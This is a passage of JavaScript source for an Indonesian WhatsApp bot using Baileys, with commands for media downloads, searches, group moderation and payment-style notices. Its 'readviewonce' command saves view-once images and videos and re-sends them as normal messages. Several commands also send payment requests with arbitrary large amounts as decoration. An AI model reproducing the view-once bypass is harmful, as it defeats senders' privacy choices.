                                text: `result from ${text}`
                            },
                            carouselMessage: {
                                cards: [
                                    {
                                        header: {
                                            videoMessage: await video(json1.play),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ T I K T O K - S C R O L L ]\n\n${hiasan}*Duration* : ${json1.duration || 'N/A'}\n${hiasan}*Play* : ${json1.play_count || 0}\n${hiasan}*Download* : ${json1.download_count || 0}\n${hiasan}*Share* : ${json1.share_count || 0}\n${hiasan}*Comment* : ${json1.comment_count || 0}\n${hiasan}*Like* : ${json1.digg_count || 0}\n\n`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{\"display_text\":\"NEXT VIDEO\",\"id\":\".tiktokscroll ${text}\"}`
                                                },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            videoMessage: await video(json2.play),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ T I K T O K - S C R O L L ]\n\n${hiasan}*Duration* : ${json2.duration || 'N/A'}\n${hiasan}*Play* : ${json2.play_count || 0}\n${hiasan}*Download* : ${json2.download_count || 0}\n${hiasan}*Share* : ${json2.share_count || 0}\n${hiasan}*Comment* : ${json2.comment_count || 0}\n${hiasan}*Like* : ${json2.digg_count || 0}\n\n`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{\"display_text\":\"NEXT VIDEO\",\"id\":\".tiktokscroll ${text}\"}`
                                                },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            videoMessage: await video(json3.play),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ T I K T O K - S C R O L L ]\n\n${hiasan}*Duration* : ${json3.duration || 'N/A'}\n${hiasan}*Play* : ${json3.play_count || 0}\n${hiasan}*Download* : ${json3.download_count || 0}\n${hiasan}*Share* : ${json3.share_count || 0}\n${hiasan}*Comment* : ${json3.comment_count || 0}\n${hiasan}*Like* : ${json3.digg_count || 0}\n\n`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{\"display_text\":\"NEXT VIDEO\",\"id\":\".tiktokscroll ${text}\"}`
                                                },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            videoMessage: await video(json4.play),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ T I K T O K - S C R O L L ]\n\n${hiasan}*Duration* : ${json4.duration || 'N/A'}\n${hiasan}*Play* : ${json4.play_count || 0}\n${hiasan}*Download* : ${json4.download_count || 0}\n${hiasan}*Share* : ${json4.share_count || 0}\n${hiasan}*Comment* : ${json4.comment_count || 0}\n${hiasan}*Like* : ${json4.digg_count || 0}\n\n`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{\"display_text\":\"NEXT VIDEO\",\"id\":\".tiktokscroll ${text}\"}`
                                                },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            videoMessage: await video(json5.play),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `[ T I K T O K - S C R O L L ]\n\n${hiasan}*Duration* : ${json5.duration || 'N/A'}\n${hiasan}*Play* : ${json5.play_count || 0}\n${hiasan}*Download* : ${json5.download_count || 0}\n${hiasan}*Share* : ${json5.share_count || 0}\n${hiasan}*Comment* : ${json5.comment_count || 0}\n${hiasan}*Like* : ${json5.digg_count || 0}\n\n`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    "name": "quick_reply",
                                                    "buttonParamsJson": `{\"display_text\":\"NEXT VIDEO\",\"id\":\".tiktokscroll ${text}\"}`
                                                },
                                            ],
                                        },
                                    },

                                ],
                                messageVersion: 1,
                            },
                        },
                    },
                },
            },
            {}
        );

        await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });
    } catch (error) {
        console.error(error);
        m.reply('Terjadi kesalahan saat mengirim pesan.');
    }
}
break;

case 'cekip': case 'ip': {
if (limitnya < 1) return m.reply(mess.limit)
if (args.length !== 1) {
return m.reply('Format salah! Penggunaan: cekip link');
}
const link = args[0];
dns.resolve4(link, (err, addresses) => {
if (err) {
return m.reply('Gagal melakukan DNS reverse lookup.');
}
if (addresses.length === 0) {
return m.reply('Tidak ada alamat IP yang ditemukan.');
}
const ip = addresses[0];
m.reply(`Alamat IP dari ${link} adalah: ${ip}`);
});
uselimit()}
break

case 'cerpen': {
const mann = require('d-scrape')
const mannr = await mann.random.randomCerpen()
var yaya = `*[ R A N D O M  C E R P E N ]*\n\n*Judul:* ${mannr.judul}\n*Penulis:* ${mannr.penulis}\n\n${mannr.cerita}\n\n_${mannr.sumber}_`
m.reply(yaya)
}
break

case 'readvo': case 'readviewonce': {
if (!m.quoted) return m.reply(`Reply view once message to use this command`)
m.reply(mess.wait)
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
var media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (let chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await RezzHost.sendMessage(m.chat, { video: buffer, caption: quotedType.caption }, {quoted: kalgans })
} else if (/image/.test(type)) {
await RezzHost.sendMessage(m.chat, { image: buffer, caption: quotedType.caption }, {quoted: kalgans })
}
}
break

case 'tourl': {
if (limitnya < 1) return m.reply(mess.limit)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
uselimit()}
break

case 'daftar': case 'regis': case 'register': {
if (isRegistered) return m.reply('Kamu sudah terdaftar')
const serialUser = createSerial(20)
mzd = `───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

○ Nomor : @${m?.sender.split('@')[0]}
○ Nama : ${pushname}
○ Status : Sukses✅ 
○ Ns : ${serialUser}

Jangan Lupa Baca Rules Ya ${pushname}...
Data User Yang Tersimpan Di Database Bot, Di Jamin Aman Tanpa Tershare (. ❛ ᴗ ❛.)`
veri = m?.sender
if (!m.isGroup) {
addRegisteredUser(m?.sender, pushname, serialUser)
RezzHost.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | R E G I S T E R`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
mediaType: 1,
renderLargerThumbnail: true
}}
})
} else {
addRegisteredUser(m?.sender, pushname, serialUser)
RezzHost.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | R E G I S T E R`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
}
break

case 'ss': case 'ssweb': {
if (limitnya < 1) return m.reply(mess.limit)
const scp1 = require('./lib/myfunc') 
if (!q) return m.reply(`Example ${prefix+command} link`)
m.reply(mess.search)
let krt = await scp1.ssweb(q)
RezzHost.sendMessage(from,{image:krt.result,caption: mess.success}, {quoted:kalgans})
uselimit()}
break
//BATAS MAIN MENU


// DOWNLOAD MENU
case 'tiktok':
case 'tt': {
if (limitnya < 1) return m.reply(mess.limit)
if (args.length == 0) return m.reply(`Example: ${prefix + command} link lu`)
let res = await tiktok(`${args[0]}`)
RezzHost.sendMessage(m.chat, { video: { url: res.nowm }, caption: res.title, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
RezzHost.sendMessage(m.chat, { audio: { url: res.audio }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
})
uselimit()
}
break

case "ytreels": case "ytmp4":{
if (limitnya < 1) return m.reply(mess.limit)
if (!text) return m.reply('Masukan Link Nya!!!')
m.reply(mess.wait)
downloadMp4(text)
uselimit()
}
break

case 'ytmp3': case 'youtubemp3': {
if (limitnya < 1) return m.reply(mess.limit)
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
m.reply(mess.wait)
downloadMp3(text)
uselimit()
}
break

case 'instagram': {
if (limitnya < 1) return m.reply(mess.limit)
if (!text) throw `Example : ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`
m.reply(mess.wait)
let iganu = await igdl2(text)
RezzHost.sendMessage(m.chat, { video: { url: iganu[0].url }, caption: mess.success })
uselimit()}
break

case 'mediafire': {
if (!args[0]) return m.reply(`Enter the mediafire link next to the command`)
if (!args[0].match(/mediafire/gi)) return m.reply(`Link incorrect`)
const { mediafiredl } = require('@bochilteam/scraper')
let full = /f$/i.test(command)
let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
let res = await mediafiredl(args[0])
let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
let caption = `
≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
RezzHost.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
}
break

case 'git': case 'gitclone': {
if (!args[0]) return m.reply2(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply2(`Link invalid!!`)
m.reply(mess.search)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
RezzHost.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: kalgans }).catch((err) => m.reply('emror'))
}
break 

//BATAS DOWN MENU

//GROUP MENU
case "promote":{
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!text && !m.quoted) m.reply('masukkan nomor yang ingin di promote')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RezzHost.groupParticipantsUpdate(m.chat, [users], 'promote').catch(console.log)
}
break

case 'antilink': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case "demote":{
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!text && !m.quoted) m.reply('masukkan nomor yang ingin di demote')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RezzHost.groupParticipantsUpdate(m.chat, [users], 'demote').catch(console.log)
}
break

case 'sendlinkgc': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.badm)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282173242194`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await RezzHost.groupInviteCode(from)
RezzHost.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.badm)
RezzHost.groupRevokeInvite(from)
break

case 'editdesk':{
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.badm)
if (!isAdmins) return m.reply(mess.admin)
if (!text) return m.reply(`Text Nya ?`)
await RezzHost.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break
case "open": {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.Badmin)
await RezzHost.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Anggota Dapat Mengirim Pesan")
}
break
case "close": {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.Badmin)
if (!isAdmin && !isOwner) return RainMeReply(msg.admin)
await RezzHost.groupSettingUpdate(m.chat, 'announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
case 'closetime':
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.Badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 m.reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
RezzHost.groupSettingUpdate(from, 'announcement')
m.reply(close)
}, timer)
break

case "opentime": {
if (!m?.isGroup) return m.reply("Khusus Dalam Group")
if (!isAdmins && !isCreator) return m.reply("Khusus Admin Group")
if (!isBotAdmins) return m.reply("Jadikan Bot Sebagai Admin Terlebih Dahulu Jika Ingin Menggunakan Fitur Ini")
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return m.reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
m.reply(`Open Time ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
const nomor = m.participant
const open = `*Tepat Waktu* Grup Dibuka Oleh Admin\nSekarang Member Dapat Mengirim Pesan`
RezzHost.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(open)
}, timer)
}
break

//SEARCH MENU

case  'yts': case 'ytsearch': {
if (limitnya < 1) return m.reply(mess.limit)
if (!text) return m.reply(`Example : ${prefix + command} Drunk Text`)
if (limitnya < 1) return m.reply(mess.limit)
m.reply(mess.wait)
let search = await yts(text)
let teks = '*YouTube Search*\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
RezzHost.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: kalgans })
uselimit()}
break

case "google":{
if (limitnya < 1) return m.reply(mess.limit)
if (!text) return m.reply(`Example : ${prefix + command} ${botname}`);
let google = require("google-it");
google({ query: text }).then((res) => {
let teks = `Google Search From : ${text}\n\n`;
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`;
teks += `⭔ *Description* : ${g.snippet}\n`;
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`;
}
m.reply(teks);
});
uselimit()}
break


case "add":{
if (m.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m.reply('masukkan nomor yang ingin di tambahkan')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RezzHost.groupParticipantsUpdate(m?.chat, [users], 'add').catch(console.log)
}
break

case "kick":{
if (m.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m.reply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RezzHost.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break

case 'linkgroup': case 'linkgc': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.badm)
let response = await RezzHost.groupInviteCode(from)
RezzHost.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'tagall': {
if (!isAdmins) return m.reply(mess.admin)
if (!m.isGroup) return
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
RezzHost.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: kalgans })
}
break

case 'biochange':
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return m.reply(`Example ${prefix + command} on/off`)
if (q == 'enable') {
autobio = true
m.reply(`Berhasil Mengubah AutoBio Ke ${q}`)
} else if (q == 'disable') {
autobio = false
m.reply(`Berhasil Mengubah AutoBio Ke ${q}`)
}
break   

case 'autobio': {
if (!isCreator) return m.reply(mess.owner)
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ''
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: "[ *RISKY HOST – New Version* ]"
}),
header: proto.Message.InteractiveMessage.Header.create({
title: Styles(`click button *enable* to enable autobio\nclick button *disable* to disable autobio`),
subtitle: "rorr",
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".biochange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".biochange disable\"}"
},],})})}}}, {})
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'rezzhostchat': {
if (!isCreator) return (mess.owner)
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ''
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: "Simpel WhatsApp Bot"
}),
header: proto.Message.InteractiveMessage.Header.create({
title: (`click button *enable* to enable autobio\nclick button *disable* to disable autobio`),
subtitle: `${ownername}`,
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".rezzhostchatchange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".rezzhostchatchange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'rezzhostchatchange':{
if (args[0] === "enable") {
if (db.data.chats[m.chat].RezzHost) return m.reply(`activated`)
db.data.chats[m.chat].RezzHost = true
m.reply('Successfully Activate Auto Chat')
} else if (args[0] === "disable") {
if (!db.data.chats[m.chat].RezzHost) return m.reply(`it's deactivated`)
db.data.chats[m.chat].RezzHost = false
m.reply('Successfully Disabling Auto Chat ')
} else {
m.reply(`${prefix+command} enable -- _mengaktifkan_\n${prefix+command} disable -- _Menonaktifkan_`)
}}
break

case'bard':{
if (limitnya < 1) return m.reply(mess.limit)
if (!text) return m.reply(`*Example*: ${prefix + command} siapa kamu`)
let res = await bard(text)
RezzHost.sendMessage(m.chat, {
text: res,
contextInfo: {
externalAdReply:{
title: `Bard-Ai`,
body: `Bard-Ai`,
thumbnailUrl: `https://telegra.ph/file/e93bdeb0ad6e6d22d57c4.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted: kalgans})
uselimit()}
break

case 'delsesi':
case 'clearsession':{
fs.readdir("./session", async function(err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return m.reply('Unable to scan directory: ' + err);
}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
)
console.log(filteredArray.length);
let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(e, i) {
teks += (i + 1) + `. ${e}\n`
})
m.reply(teks)
await sleep(2000)
m.reply("Menghapus file sampah...")
await filteredArray.forEach(function(file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
m.reply("Berhasil menghapus semua sampah di folder session")
});
}
break

case 'setname': case 'setsubject': {
if (!text) return m.reply(`Text ?`)
await RezzHost.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
}
break

case 'esceh': case 'script': case 'sc': {
let Rawwwwr = `*SECRIP INI TIDAK DI PERJUAL BELI KAN SECRIP INI FREE 100%*

*AMBIL SECRIPT NYA DI*
> SALURAN WHATSAP : https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k

> YOUTUBE : https://www.youtube.com/@InzieOfcHosting

TOLONG JANGAN PERJUAL BELIKAN SECRIP INI !!!
`
 RezzHost.relayMessage(m.chat, {
requestPaymentMessage: {
lcurrencyCodeIso4217: 'IDR',
amount1000: 20000 * 20000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: `Sorry not open source code

*If you want to ask questions, please chat :*
> _https://wa.me/6282173242194 (owner)

*Jika ingin Tahu Informasi Mengenai Bot Ini :*
> _-_

*Jika Ingin Memainkan Bot Ini :*
> _-_`,
contextInfo: {
mentionedJid: [owner[1] + '@s.whatsapp.net'],
externalAdReply: {
showAdAttribution: true
}
}
}
}
}
}, {})
}
break

case "done": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply("barang,harga\n\n*Contoh :* Panel Unlimited,2")
if (!text.split(",")) return m.reply("barang,harga\n\n*Contoh :* Panel Unlimited,2")
const [barang, harga] = text.split(",")
if (isNaN(harga)) return m.reply("Format Harga Tidak Valid")
var total = `${harga}000000`
var total2 = Number(`${harga}000`)
const teks = `*TRANSAKSI DONE BY ${ownername} ✅*

*📦 Barang :* ${barang}
*💸 Nominal :* Rp${toRupiah(total2)}
*⏰ Waktu :* ${time}

_*Terimakasih Sudah Mempercayai & Menggunakan Jasa Saya 🥳*_`
 RezzHost.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: Number(total), requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: `${teks}`, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}
break

case 'tunda':
text_trxpending = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 」

𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxpending,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break

case 'batal':
text_trxbatal = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal2}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${time}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxbatal,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break

case "reqpanel":{
if (!isCreator) return;
ewe = `*بِسۡـــــــــمِ ٱللهِ ٱلرَّحۡـمَـٰنِ ٱلرَّحِـــــــيم*

Ram : 
Username :
Nomor Wa : 
▰▰▰▰▰▰▰▰
*Garansi 14 Day*
*Create ${tanggal2}*
*Hari Ini ${hariini}*`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break

case 'pembayaran': case 'nopekayy': case 'payment':{
teks28 = `*❏––––––『 PAYMENT SAYA 』––––––❏*
 
⫹⫺ PAYMENT
Dana: 089667644225
Gopay: -
Jangan Lupa Send Bukti TF  😁`
RezzHost.sendMessage(from, { image: { url: "https://telegra.ph/file/24b24857cf823991a2c5f.jpg" }, caption: teks28 }, { quoted: kalgans })
}
break

case'Rezz':{
if (!text) return m.reply(`Ya Kamu Kah Panggil Aku? Kenapa Panggil Rezz Bang`)
function checkText(text) {
const lowerCaseText = text.toLowerCase();
if (lowerCaseText.includes('cariin') || lowerCaseText.includes('carikan') || lowerCaseText.includes('putarin') || lowerCaseText.includes('putarkan')) {
return 'ok';
} else {
return 'no';
}
}
 if (text.includes('grup') && text.includes('tutup')) {
if (!isBotAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
if (!isAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
    
await RezzHost.groupSettingUpdate(m.chat, 'announcement')
m.reply(`Oke, grup telah ditutup. Semoga lebih teratur ya~ 😉`);
} else if (text.includes('grup') && text.includes('buka')) {
if (!isBotAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
if (!isAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
 
await RezzHost.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(`Oke, grup telah dibuka. Ayo kita beraktivitas bersama-sama! 😉`);
} else if (text.includes('kick') || text.includes('kik')) {
if (!isBotAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
        if (!isAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
 
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
await RezzHost.groupParticipantsUpdate(m.chat, [users], 'remove')
m.reply(`Maaf Ya Terpaksa Aku Tendang 😖, Perintah Admin Sih..`)
} else if (checkText(text) === 'ok') {
async function findSong(text) {
const natural = require('natural');
const tokenizer = new natural.WordTokenizer();
const tokens = tokenizer.tokenize(text.toLowerCase());

const keywords = ['putar', 'putarkan', 'putarlagu', 'lagu', 'cariin', 'carikan', 'mainkan', 'mainkanlagu', 'play', 'playmusic', 'playasong'];
const songKeywords = tokens.filter(token => keywords.includes(token));

if (songKeywords.length === 0) {
return "Maaf, tidak dapat menemukan permintaan lagu dalam teks tersebut.";}
let songTitle = tokens.slice(tokens.indexOf(songKeywords[0]) + 1).join(' ');
return songTitle}
const songName = await findSong(text)
m.reply(`Oke, tunggu sebentar ya~ Aku sedang mencari "${songName}" untukmu! 😉`);
await sleep(6000)
let res = await yts(text)
let vid = res.videos[0]
await RezzHost.sendMessage(m.chat, { react: { text: "🧢",key: m.key,}
})  
if (!vid) return m.reply('Tidak di temukan, coba untuk membalikkan judul dan author nya')
let { title, description, thumbnail, videoId, durationH, viewH, publishedTime } = vid
m.reply(`Berikut adalah lagu yang kamu pilih: ${title}`)
const url = 'https://www.youtube.com/watch?v=' + videoId
const yt = await youtubedl(url).catch(async () => await youtubedlv2(url))
const link = await yt.audio['128kbps'].download()
try {
let doc = { 
audio: 
{ 
url: link 
